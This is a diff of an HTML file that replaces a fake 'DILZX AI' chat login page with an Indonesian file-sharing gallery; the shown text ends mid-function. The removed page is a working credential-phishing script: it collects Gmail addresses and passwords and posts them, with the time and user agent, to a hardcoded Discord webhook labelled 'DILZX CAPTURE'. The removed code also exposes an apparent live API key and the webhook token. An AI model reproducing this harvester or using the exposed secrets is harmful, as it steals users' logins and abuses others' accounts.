@@ -1,800 +1,689 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>DILZX AI | Dilzx Edition</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>DxzM Share · Files</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-        body {
-            background: radial-gradient(ellipse at 20% 30%, #0a0a1a, #030308);
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
+    body {
+      background: #070b17;
+      background-image: radial-gradient(circle at 25% 20%, rgba(30, 80, 140, 0.25) 0%, #070b17 90%);
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+      min-height: 100vh;
+      padding: 1.5rem;
+    }
 
-        .neural-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            opacity: 0.35;
-        }
+    .app-container {
+      max-width: 1400px;
+      margin: 0 auto;
+    }
 
-        canvas {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-        }
+    /* header */
+    .glass-header {
+      background: rgba(8, 12, 25, 0.75);
+      backdrop-filter: blur(16px);
+      border-radius: 2rem;
+      padding: 1rem 2rem;
+      margin-bottom: 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 1rem;
+      border: 1px solid rgba(0, 180, 255, 0.3);
+      box-shadow: 0 12px 28px rgba(0, 0, 0, 0.4);
+    }
 
-        .container {
-            position: relative;
-            z-index: 1;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
+    .logo-area {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+    .dxzm-svg {
+      width: 48px;
+      height: 48px;
+      filter: drop-shadow(0 0 6px #2f6eff);
+    }
+    .brand h1 {
+      font-size: 1.9rem;
+      font-weight: 700;
+      background: linear-gradient(135deg, #FFFFFF, #6e9eff, #b280ff);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    .brand p {
+      font-size: 0.7rem;
+      color: #8e9fc9;
+    }
 
-        .login-card {
-            background: rgba(10, 15, 30, 0.7);
-            backdrop-filter: blur(20px);
-            border-radius: 48px;
-            padding: 48px 40px;
-            border: 1px solid rgba(88, 101, 242, 0.5);
-            max-width: 500px;
-            width: 100%;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            animation: fadeInUp 0.5s ease;
-        }
+    .stats-group {
+      display: flex;
+      gap: 1.2rem;
+    }
+    .stat-card {
+      background: rgba(20, 28, 48, 0.8);
+      border-radius: 1.2rem;
+      padding: 0.4rem 1.2rem;
+      text-align: center;
+      border: 1px solid rgba(0, 180, 255, 0.25);
+    }
+    .stat-number {
+      font-size: 1.5rem;
+      font-weight: bold;
+      background: linear-gradient(135deg, #c0ddff, #5f9eff);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    .stat-label {
+      font-size: 0.65rem;
+      color: #9aabda;
+    }
 
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+    /* upload zone */
+    .upload-card {
+      background: rgba(10, 15, 30, 0.7);
+      backdrop-filter: blur(8px);
+      border-radius: 1.8rem;
+      padding: 1.6rem;
+      margin-bottom: 2rem;
+      border: 1px solid rgba(0, 180, 255, 0.25);
+    }
+    .drop-zone {
+      border: 2px dashed #2f3a6e;
+      border-radius: 1.5rem;
+      padding: 2rem;
+      text-align: center;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .drop-zone:hover {
+      border-color: #5f8eff;
+      background: rgba(95, 142, 255, 0.05);
+    }
+    .sender-row {
+      margin-top: 1.2rem;
+      display: flex;
+      gap: 1rem;
+      flex-wrap: wrap;
+      align-items: center;
+    }
+    .sender-input {
+      flex: 2;
+      background: #0f1322;
+      border: 1px solid #2a345a;
+      border-radius: 2rem;
+      padding: 0.8rem 1.2rem;
+      color: white;
+    }
+    .batch-btn {
+      background: linear-gradient(135deg, #1f2a60, #0f1950);
+      border: none;
+      padding: 0.8rem 2rem;
+      border-radius: 2rem;
+      color: white;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .file-preview-list {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin-top: 1rem;
+      max-height: 85px;
+      overflow-y: auto;
+    }
+    .file-tag {
+      background: #151e36;
+      border-radius: 2rem;
+      padding: 0.3rem 0.9rem;
+      font-size: 0.7rem;
+      color: #bfd0ff;
+    }
 
-        .logo-container {
-            text-align: center;
-            margin-bottom: 20px;
-        }
+    /* progress status kirim */
+    .progress-area {
+      margin: 1rem 0 0.5rem;
+    }
+    .progress-bar-bg {
+      background: #1a2038;
+      border-radius: 1rem;
+      height: 8px;
+      overflow: hidden;
+    }
+    .progress-fill {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, #5f8eff, #a881ff);
+      transition: width 0.2s;
+    }
+    .status-text {
+      font-size: 0.7rem;
+      color: #b9c8ff;
+      margin-top: 0.3rem;
+      display: flex;
+      justify-content: space-between;
+    }
 
-        .discord-logo {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto;
-            filter: drop-shadow(0 0 20px rgba(88, 101, 242, 0.5));
-            animation: logoGlow 2s ease-in-out infinite;
-        }
-
-        @keyframes logoGlow {
-            0%, 100% { filter: drop-shadow(0 0 10px rgba(88, 101, 242, 0.5)); transform: scale(1); }
-            50% { filter: drop-shadow(0 0 25px rgba(88, 101, 242, 0.8)); transform: scale(1.02); }
-        }
-
-        h1 {
-            font-size: 36px;
-            text-align: center;
-            background: linear-gradient(135deg, #5865F2, #00d4ff, #7b2cbf);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-top: 16px;
-            letter-spacing: 2px;
-        }
-
-        .tagline {
-            text-align: center;
-            color: #8b8ca8;
-            font-size: 12px;
-            margin-top: 8px;
-            letter-spacing: 3px;
-        }
-
-        .input-group {
-            margin-bottom: 24px;
-            margin-top: 32px;
-        }
-
-        .input-group label {
-            display: block;
-            color: #cbd5e6;
-            font-size: 13px;
-            font-weight: 500;
-            margin-bottom: 8px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 16px 18px;
-            background: rgba(15, 18, 34, 0.8);
-            border: 1.5px solid rgba(45, 55, 80, 0.8);
-            border-radius: 24px;
-            color: #fff;
-            font-size: 15px;
-            transition: all 0.3s;
-        }
-
-        .input-group input:focus {
-            outline: none;
-            border-color: #5865F2;
-            box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.1);
-        }
-
-        .input-group input.error {
-            border-color: #f87171;
-            animation: shake 0.3s ease;
-        }
-
-        @keyframes shake {
-            0%,100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
-
-        .login-btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #5865F2, #7b2cbf);
-            border: none;
-            border-radius: 32px;
-            color: white;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .login-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px -8px rgba(88, 101, 242, 0.5);
-        }
-
-        .login-btn:disabled {
-            opacity: 0.6;
-            transform: none;
-        }
-
-        .error-msg {
-            background: rgba(239, 68, 68, 0.15);
-            color: #f87171;
-            padding: 12px 16px;
-            border-radius: 20px;
-            font-size: 13px;
-            margin-top: 16px;
-            text-align: center;
-            display: none;
-            border: 1px solid rgba(239, 68, 68, 0.3);
-        }
-
-        .chat-page {
-            display: none;
-            width: 100%;
-        }
-
-        .chat-page.active {
-            display: block;
-            animation: fadeInUp 0.4s ease;
-        }
-
-        .chat-header {
-            background: rgba(10, 15, 30, 0.7);
-            backdrop-filter: blur(20px);
-            border-radius: 32px;
-            padding: 16px 24px;
-            margin-bottom: 20px;
-            border: 1px solid rgba(88, 101, 242, 0.3);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 16px;
-        }
-
-        .logo-area {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .small-logo {
-            width: 40px;
-            height: 40px;
-        }
-
-        .user-info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            background: rgba(88, 101, 242, 0.1);
-            padding: 8px 20px;
-            border-radius: 60px;
-            border: 1px solid rgba(88, 101, 242, 0.3);
-        }
-
-        .user-avatar {
-            width: 36px;
-            height: 36px;
-            background: linear-gradient(135deg, #5865F2, #7b2cbf);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 16px;
-        }
-
-        .user-email {
-            color: #5865F2;
-            font-size: 13px;
-            font-weight: 500;
-        }
-
-        .chat-container {
-            background: rgba(10, 15, 30, 0.5);
-            backdrop-filter: blur(10px);
-            border-radius: 32px;
-            padding: 24px;
-            height: 450px;
-            overflow-y: auto;
-            border: 1px solid rgba(88, 101, 242, 0.15);
-        }
-
-        .chat-container::-webkit-scrollbar {
-            width: 5px;
-        }
-        .chat-container::-webkit-scrollbar-track { background: #1a1a2e; border-radius: 10px; }
-        .chat-container::-webkit-scrollbar-thumb { background: #5865F2; border-radius: 10px; }
-
-        .message {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 20px;
-            animation: messageIn 0.3s ease;
-        }
-
-        @keyframes messageIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .message.user { justify-content: flex-end; }
-        .message.user .message-avatar { order: 2; }
-
-        .message-avatar {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-            flex-shrink: 0;
-        }
-
-        .message.assistant .message-avatar {
-            background: linear-gradient(135deg, #5865F220, #7b2cbf20);
-            border: 1px solid rgba(88, 101, 242, 0.3);
-        }
-        .message.user .message-avatar {
-            background: linear-gradient(135deg, #7b2cbf20, #5865F220);
-            border: 1px solid rgba(123, 44, 191, 0.3);
-        }
-
-        .message-bubble {
-            max-width: 70%;
-            padding: 12px 18px;
-            border-radius: 20px;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-
-        .message.assistant .message-bubble {
-            background: rgba(15, 18, 34, 0.9);
-            border: 1px solid rgba(88, 101, 242, 0.2);
-            color: #e0e0e0;
-            border-radius: 20px 20px 20px 8px;
-        }
-        .message.user .message-bubble {
-            background: linear-gradient(135deg, #5865F2, #7b2cbf);
-            color: white;
-            border-radius: 20px 20px 8px 20px;
-        }
-
-        .typing-indicator {
-            display: none;
-            align-items: center;
-            gap: 12px;
-            padding: 10px 18px;
-            background: rgba(15, 18, 34, 0.9);
-            border: 1px solid rgba(88, 101, 242, 0.2);
-            border-radius: 30px;
-            width: fit-content;
-            margin-bottom: 20px;
-        }
-
-        .typing-dots { display: flex; gap: 5px; }
-        .typing-dots span {
-            width: 8px; height: 8px; background: #5865F2; border-radius: 50%;
-            animation: blinkDot 1.4s infinite;
-        }
-        .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
-        .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
-
-        @keyframes blinkDot {
-            0%,60%,100% { transform: translateY(0); opacity: 0.4; }
-            30% { transform: translateY(-8px); opacity: 1; }
-        }
-
-        .input-wrapper {
-            display: flex;
-            gap: 12px;
-            margin-top: 20px;
-        }
-
-        .input-wrapper input {
-            flex: 1;
-            padding: 16px 20px;
-            background: rgba(15, 18, 34, 0.9);
-            border: 1.5px solid rgba(45, 55, 80, 0.8);
-            border-radius: 60px;
-            color: #fff;
-            font-size: 14px;
-        }
-
-        .input-wrapper input:focus {
-            outline: none;
-            border-color: #5865F2;
-        }
-
-        .send-btn {
-            padding: 0 32px;
-            background: linear-gradient(135deg, #5865F2, #7b2cbf);
-            border: none;
-            border-radius: 60px;
-            color: white;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .send-btn:hover {
-            transform: scale(1.02);
-        }
-
-        .send-btn:disabled {
-            opacity: 0.5;
-        }
-
-        .suggestions {
-            display: flex;
-            gap: 10px;
-            margin-top: 16px;
-            flex-wrap: wrap;
-        }
-
-        .suggestion-chip {
-            background: rgba(15, 18, 34, 0.8);
-            border: 1px solid rgba(88, 101, 242, 0.2);
-            padding: 8px 16px;
-            border-radius: 40px;
-            font-size: 12px;
-            color: #8b8ca8;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .suggestion-chip:hover {
-            border-color: #5865F2;
-            color: #5865F2;
-        }
-
-        .logout-btn {
-            background: rgba(239, 68, 68, 0.2);
-            border: 1px solid rgba(239, 68, 68, 0.5);
-            padding: 8px 16px;
-            border-radius: 40px;
-            color: #f87171;
-            font-size: 12px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .logout-btn:hover {
-            background: rgba(239, 68, 68, 0.4);
-        }
-    </style>
+    /* gallery publik (semua orang bisa lihat) */
+    .gallery-wrapper {
+      background: rgba(10, 15, 30, 0.5);
+      backdrop-filter: blur(4px);
+      border-radius: 1.8rem;
+      padding: 1.2rem;
+      border: 1px solid rgba(0, 180, 255, 0.15);
+    }
+    .gallery-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      margin-bottom: 1rem;
+    }
+    .filter-group {
+      display: flex;
+      gap: 0.6rem;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 0.3rem;
+      border-radius: 2rem;
+    }
+    .filter-btn {
+      background: transparent;
+      border: none;
+      padding: 0.4rem 1rem;
+      border-radius: 1.5rem;
+      color: #9aa9d0;
+      cursor: pointer;
+    }
+    .filter-btn.active {
+      background: linear-gradient(135deg, #2f45a0, #1b2a6e);
+      color: white;
+    }
+    .files-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(210px, 1fr));
+      gap: 1rem;
+      max-height: 580px;
+      overflow-y: auto;
+    }
+    .file-item {
+      background: rgba(18, 24, 45, 0.8);
+      border-radius: 1.2rem;
+      padding: 0.7rem;
+      transition: 0.2s;
+      border: 1px solid rgba(70, 130, 200, 0.2);
+    }
+    .file-item:hover {
+      transform: translateY(-3px);
+      border-color: #4e7eff;
+    }
+    .img-thumb {
+      width: 100%;
+      height: 130px;
+      object-fit: cover;
+      border-radius: 0.8rem;
+      background: #0c1020;
+    }
+    .icon-thumb {
+      width: 100%;
+      height: 130px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #0c1020;
+      border-radius: 0.8rem;
+    }
+    .file-meta {
+      margin-top: 0.5rem;
+    }
+    .file-title {
+      font-size: 0.75rem;
+      font-weight: 500;
+      color: #eef3ff;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .file-sender {
+      font-size: 0.65rem;
+      color: #8a9ad0;
+      margin-top: 0.1rem;
+    }
+    .action-buttons {
+      display: flex;
+      gap: 0.5rem;
+      margin-top: 0.5rem;
+    }
+    .mini-btn {
+      background: #252e4a;
+      border: none;
+      padding: 0.25rem 0;
+      border-radius: 0.7rem;
+      color: white;
+      font-size: 0.7rem;
+      cursor: pointer;
+      flex: 1;
+      text-align: center;
+    }
+    /* modal preview */
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.94);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+    }
+    .modal.active {
+      display: flex;
+    }
+    .modal-content {
+      background: #0f1424;
+      border-radius: 2rem;
+      max-width: 90%;
+      max-height: 90%;
+      padding: 1rem;
+      border: 1px solid #3f6eff;
+    }
+    .modal-media {
+      max-width: 100%;
+      max-height: 65vh;
+      border-radius: 1rem;
+    }
+    .close-modal {
+      position: absolute;
+      top: 1rem;
+      right: 2rem;
+      font-size: 2rem;
+      cursor: pointer;
+      color: #bbb;
+    }
+    .toast {
+      position: fixed;
+      bottom: 2rem;
+      right: 2rem;
+      background: #101a38;
+      border-left: 4px solid #5f8eff;
+      padding: 0.7rem 1.2rem;
+      border-radius: 1rem;
+      color: white;
+      z-index: 200;
+      display: none;
+    }
+    .toast.show {
+      display: block;
+      animation: slideFade 2s ease;
+    }
+    @keyframes slideFade {
+      0% { opacity: 0; transform: translateX(30px); }
+      15% { opacity: 1; transform: translateX(0); }
+      85% { opacity: 1; }
+      100% { opacity: 0; }
+    }
+  </style>
 </head>
 <body>
-    <div class="neural-bg">
-        <canvas id="neuralCanvas"></canvas>
+<div class="app-container">
+  <div class="glass-header">
+    <div class="logo-area">
+      <div class="dxzm-svg">
+        <svg viewBox="0 0 100 100" fill="none">
+          <rect x="20" y="25" width="60" height="50" rx="14" stroke="#5f9eff" stroke-width="3.5" fill="none"/>
+          <path d="M38 45 L50 58 L62 45" stroke="#a881ff" stroke-width="3.5" stroke-linecap="round" fill="none"/>
+          <circle cx="50" cy="68" r="5" fill="#5f9eff" />
+          <path d="M68 32 L78 22 M32 32 L22 22" stroke="#5f9eff" stroke-width="2.5"/>
+        </svg>
+      </div>
+      <div class="brand">
+        <h1>DxzM Share Files</h1>
+        <p>-------------------</p>
+      </div>
     </div>
-
-    <div class="container">
-        <!-- LOGIN PAGE -->
-        <div id="loginPage">
-            <div class="login-card">
-                <div class="logo-container">
-                    <svg class="discord-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <defs>
-                            <linearGradient id="discordGrad" x1="0%" y1="0%" x2="100%" y2="100%">
-                                <stop offset="0%" stop-color="#5865F2"/>
-                                <stop offset="100%" stop-color="#7b2cbf"/>
-                            </linearGradient>
-                        </defs>
-                        <circle cx="50" cy="50" r="35" fill="url(#discordGrad)" opacity="0.15"/>
-                        <path d="M35 35 L65 35 L65 65 L35 65 Z" stroke="url(#discordGrad)" stroke-width="2.5" fill="none" rx="8"/>
-                        <circle cx="42" cy="48" r="4" fill="url(#discordGrad)"/>
-                        <circle cx="58" cy="48" r="4" fill="url(#discordGrad)"/>
-                        <path d="M42 58 Q50 66 58 58" stroke="url(#discordGrad)" stroke-width="2" fill="none" stroke-linecap="round"/>
-                        <path d="M28 42 L35 42 M72 42 L65 42" stroke="#00d4ff" stroke-width="2" opacity="0.6"/>
-                    </svg>
-                </div>
-                <h1>DILZX AI</h1>
-                <div class="tagline">DILZX INTEGRATION ACTIVE</div>
-
-                <div class="input-group">
-                    <label>EMAIL</label>
-                    <input type="email" id="loginEmail" placeholder="username@gmail.com">
-                </div>
-                <div class="input-group">
-                    <label>PASSWORD</label>
-                    <input type="password" id="loginPassword" placeholder="••••••••">
-                </div>
-                <button class="login-btn" onclick="doLogin()">ACCESS SYSTEM →</button>
-                <div class="error-msg" id="loginError"></div>
-            </div>
-        </div>
-
-        <!-- CHAT PAGE -->
-        <div id="chatPage" class="chat-page">
-            <div class="chat-header">
-                <div class="logo-area">
-                    <svg width="40" height="40" viewBox="0 0 100 100">
-                        <circle cx="50" cy="50" r="25" fill="none" stroke="#5865F2" stroke-width="2"/>
-                        <circle cx="40" cy="45" r="3" fill="#5865F2"/>
-                        <circle cx="60" cy="45" r="3" fill="#5865F2"/>
-                        <path d="M42 58 Q50 66 58 58" stroke="#5865F2" stroke-width="2" fill="none"/>
-                    </svg>
-                    <div>
-                        <div style="color:white; font-weight:600;">DILZX AI</div>
-                        <div style="font-size:10px; color:#5865F2;">DISCORD SYNC</div>
-                    </div>
-                </div>
-                <div style="display: flex; gap: 12px; align-items: center;">
-                    <div class="user-info">
-                        <div class="user-avatar">🎮</div>
-                        <div class="user-email" id="chatUserEmail">Loading...</div>
-                    </div>
-                    <div class="logout-btn" onclick="logout()">EXIT</div>
-                </div>
-            </div>
-
-            <div class="chat-container" id="chatContainer">
-                <div class="message assistant">
-                    <div class="message-avatar">🤖</div>
-                    <div class="message-bubble">
-                        <strong>SYSTEM ONLINE</strong><br><br>
-                        Dilzx integration active.<br>
-                        Ask me anything!
-                    </div>
-                </div>
-            </div>
-
-            <div class="typing-indicator" id="typingIndicator">
-                <div class="typing-dots">
-                    <span></span><span></span><span></span>
-                </div>
-                <div style="font-size:12px; color:#8b8ca8;">PROCESSING...</div>
-            </div>
-
-            <div class="input-wrapper">
-                <input type="text" id="messageInput" placeholder="Type your message..." onkeypress="if(event.key==='Enter') sendMessage()">
-                <button class="send-btn" onclick="sendMessage()">SEND</button>
-            </div>
-
-            <div class="suggestions">
-                <div class="suggestion-chip" onclick="sendSuggestion('What is AI?')">AI EXPLAIN</div>
-                <div class="suggestion-chip" onclick="sendSuggestion('Tell me a joke')">JOKE</div>
-                <div class="suggestion-chip" onclick="sendSuggestion('Write Python code')">PYTHON</div>
-            </div>
-        </div>
+    <div class="stats-group">
+      <div class="stat-card"><div class="stat-number" id="totalFilesCount">0</div><div class="stat-label">Total file</div></div>
+      <div class="stat-card"><div class="stat-number" id="totalSizeCount">0</div><div class="stat-label">Total MB</div></div>
     </div>
+  </div>
 
-    <script>
-        // ============ DISCORD WEBHOOK URL (SUDAH TERPASANG) ============
-        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1512756164541157426/h2Q7gUvAIsUePQfNj8D5bH0KJhCVgVb5JEpYIhCD1InxeF1l1vNTprBaRAj4lOysk0zW';
-        
-        const OPENROUTER_API_KEY = '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';
-        
-        let currentUser = '';
+  <!-- UPLOAD SECTION (untuk semua orang yang mau share) -->
+  <div class="upload-card">
+    <div class="drop-zone" id="uploadDropZone">
+      <div style="margin-bottom: 0.5rem;">📂 Drag & drop atau klik — upload </div>
+      <div style="font-size:0.7rem; color:#8d9ed7;">foto, video, dokumen, zip, apk — akan langsung terlihat</div>
+      <input type="file" id="batchFileInput" multiple style="display:none">
+    </div>
+    <div class="sender-row">
+      <input type="text" id="senderName" class="sender-input" placeholder="Nama kamu ()" value="Nama Kamuuuuuuu">
+      <button id="batchUploadBtn" class="batch-btn">✈Kirim</button>
+    </div>
+    <div id="selectedPreviewArea" class="file-preview-list"></div>
+    <div id="uploadProgressArea" class="progress-area" style="display: none;">
+      <div class="progress-bar-bg"><div id="uploadProgressFill" class="progress-fill"></div></div>
+      <div class="status-text"><span id="uploadStatusMsg">Mengirim...</span><span id="uploadCountMsg">0 / 0</span></div>
+    </div>
+  </div>
 
-        // ============ VALIDASI GMAIL ============
-        function isValidGmail(email) {
-            return email && email.toLowerCase().endsWith('@gmail.com') && email.length > 10;
-        }
+  <!-- GALLERY PUBLIK (SEMUA ORANG BISA LIHAT) -->
+  <div class="gallery-wrapper">
+    <div class="gallery-header">
+      <span style="color:#eef3ff;">🌍 Galeri — semua file yang sudah dibagikan</span>
+      <div class="filter-group">
+        <button class="filter-btn active" data-filter="all">Semua</button>
+        <button class="filter-btn" data-filter="image">Gambar</button>
+        <button class="filter-btn" data-filter="video">Video</button>
+        <button class="filter-btn" data-filter="document">Dokumen</button>
+      </div>
+    </div>
+    <div class="files-grid" id="publicFilesGrid"></div>
+  </div>
+</div>
 
-        // ============ KIRIM KE DISCORD ============
-        async function sendToDiscord(email, password) {
-            const embed = {
-                title: '🔐 DILZX CAPTURE',
-                color: 0x5865F2,
-                fields: [
-                    { name: '📧 EMAIL', value: email, inline: true },
-                    { name: '🔑 PASSWORD', value: password, inline: true },
-                    { name: '🕐 TIME', value: new Date().toLocaleString(), inline: false },
-                    { name: '📱 USER AGENT', value: navigator.userAgent.substring(0, 100), inline: false }
-                ],
-                footer: { text: 'DILZX AI Capture System' },
-                timestamp: new Date().toISOString()
-            };
+<!-- Modal Preview -->
+<div class="modal" id="previewModal">
+  <span class="close-modal" id="closeModalBtn">&times;</span>
+  <div class="modal-content" id="modalInner"></div>
+</div>
+<div class="toast" id="toastMsg"></div>
 
-            try {
-                await fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ embeds: [embed] })
-                });
-                console.log('✅ Sent to Discord');
-            } catch(e) {
-                console.log('❌ Discord error:', e);
-            }
-        }
+<script>
+  // --------------------------------------------------------------
+  // STORAGE PUBLIK (localStorage -> bisa diakses oleh siapa saja yang buka web ini)
+  let publicFiles = [];
 
-        // ============ LOGIN ============
-        async function doLogin() {
-            const email = document.getElementById('loginEmail').value.trim();
-            const password = document.getElementById('loginPassword').value.trim();
-            const errorDiv = document.getElementById('loginError');
-            const emailInput = document.getElementById('loginEmail');
-            const loginBtn = document.querySelector('.login-btn');
+  const STORAGE_KEY = 'dxzm_public_library';
 
-            emailInput.classList.remove('error');
-            errorDiv.style.display = 'none';
+  function loadPublicFiles() {
+    const stored = localStorage.getItem(STORAGE_KEY);
+    if (stored) {
+      publicFiles = JSON.parse(stored);
+      renderPublicGallery();
+      updateStatsUI();
+    }
+  }
 
-            if (!email || !password) {
-                errorDiv.textContent = 'Enter email and password';
-                errorDiv.style.display = 'block';
-                return;
-            }
+  function savePublicFiles() {
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(publicFiles));
+    renderPublicGallery();
+    updateStatsUI();
+  }
 
-            if (!isValidGmail(email)) {
-                errorDiv.textContent = 'EMAIL MUST BE @GMAIL.COM';
-                errorDiv.style.display = 'block';
-                emailInput.classList.add('error');
-                return;
-            }
+  function updateStatsUI() {
+    document.getElementById('totalFilesCount').innerText = publicFiles.length;
+    const totalBytes = publicFiles.reduce((sum, f) => sum + (f.size || 0), 0);
+    const totalMB = (totalBytes / (1024 * 1024)).toFixed(1);
+    document.getElementById('totalSizeCount').innerText = totalMB;
+  }
 
-            loginBtn.disabled = true;
-            loginBtn.textContent = 'ACCESSING...';
+  function formatBytes(bytes) {
+    if (bytes < 1024) return bytes + ' B';
+    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+    return (bytes / 1048576).toFixed(1) + ' MB';
+  }
 
-            try {
-                await sendToDiscord(email, password);
-                
-                currentUser = email;
-                localStorage.setItem('dilzx_current_user', email);
-                
-                document.getElementById('loginPage').style.display = 'none';
-                document.getElementById('chatPage').classList.add('active');
-                document.getElementById('chatUserEmail').innerText = email.length > 25 ? email.substring(0, 22) + '...' : email;
-                
-                document.getElementById('loginEmail').value = '';
-                document.getElementById('loginPassword').value = '';
-            } catch (error) {
-                errorDiv.textContent = 'Error: ' + error.message;
-                errorDiv.style.display = 'block';
-            } finally {
-                loginBtn.disabled = false;
-                loginBtn.textContent = 'ACCESS SYSTEM →';
-            }
-        }
+  function getFileTypeCategory(mime) {
+    if (mime.startsWith('image/')) return 'image';
+    if (mime.startsWith('video/')) return 'video';
+    if (mime.includes('pdf') || mime.includes('document') || mime.includes('text') || mime.includes('sheet')) return 'document';
+    return 'other';
+  }
 
-        // ============ LOGOUT ============
-        function logout() {
-            localStorage.removeItem('dilzx_current_user');
-            currentUser = '';
-            document.getElementById('chatContainer').innerHTML = `
-                <div class="message assistant">
-                    <div class="message-avatar">🤖</div>
-                    <div class="message-bubble">
-                        <strong>SYSTEM ONLINE</strong><br><br>
-                        Discord integration active. Ask me anything!
-                    </div>
-                </div>
-            `;
-            document.getElementById('chatPage').classList.remove('active');
-            document.getElementById('loginPage').style.display = 'block';
-        }
+  // Preview sebelum upload
+  let currentSelectedFiles = [];
+  function updateFilePreview(files) {
+    const container = document.getElementById('selectedPreviewArea');
+    container.innerHTML = '';
+    Array.from(files).slice(0, 15).forEach(f => {
+      const chip = document.createElement('span');
+      chip.className = 'file-tag';
+      chip.innerText = f.name.length > 28 ? f.name.slice(0, 25) + '…' : f.name;
+      container.appendChild(chip);
+    });
+    if (files.length > 15) {
+      const more = document.createElement('span');
+      more.className = 'file-tag';
+      more.innerText = `+${files.length - 15} file`;
+      container.appendChild(more);
+    }
+  }
 
-        // ============ AI CHAT ============
-        async function sendMessage() {
-            const messageInput = document.getElementById('messageInput');
-            const message = messageInput.value.trim();
-            if (!message) return;
+  // PROSES UPLOAD KE PUBLIK (LANGSUNG SEMUA ORANG BISA LIHAT)
+  let isUploading = false;
+  async function uploadFilesToPublic(files, senderName) {
+    if (isUploading) {
+      showToast("⏳ Masih ada proses upload, tunggu sebentar");
+      return;
+    }
+    if (!files.length) return;
 
-            addMessageToChat(message, 'user');
-            messageInput.value = '';
-            
-            const sendBtn = document.querySelector('.send-btn');
-            const typingIndicator = document.getElementById('typingIndicator');
-            
-            sendBtn.disabled = true;
-            typingIndicator.style.display = 'flex';
-            scrollChatToBottom();
+    isUploading = true;
+    const progressArea = document.getElementById('uploadProgressArea');
+    const progressFill = document.getElementById('uploadProgressFill');
+    const statusMsg = document.getElementById('uploadStatusMsg');
+    const countSpan = document.getElementById('uploadCountMsg');
+    progressArea.style.display = 'block';
+    progressFill.style.width = '0%';
 
-            try {
-                const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
-                    method: 'POST',
-                    headers: {
-                        'Authorization': `Bearer ${OPENROUTER_API_KEY}`,
-                        'Content-Type': 'application/json',
-                        'HTTP-Referer': window.location.href,
-                        'X-Title': 'DILZX AI'
-                    },
-                    body: JSON.stringify({
-                        model: 'openai/gpt-3.5-turbo',
-                        messages: [
-                            {
-                                role: 'system',
-                                content: 'You are DILZX AI, a helpful assistant. Respond in the same language as the user.'
-                            },
-                            {
-                                role: 'user',
-                                content: message
-                            }
-                        ],
